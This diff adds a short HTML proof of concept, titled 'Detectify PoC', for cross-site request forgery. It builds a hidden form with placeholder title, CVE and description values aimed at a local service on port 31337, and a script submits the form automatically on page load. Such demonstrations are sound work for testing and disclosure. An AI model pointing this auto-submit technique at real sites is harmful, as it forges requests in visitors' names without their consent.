@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Detectify PoC</h1>
+    <form action="http://localhost:31337/new" method="POST" id="csrfForm">
+      <input type="hidden" name="title" value="titulo" />
+      <input type="hidden" name="cve" value="CVE-1337-1333331" />
+      <input type="hidden" name="description" value="desc" />
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
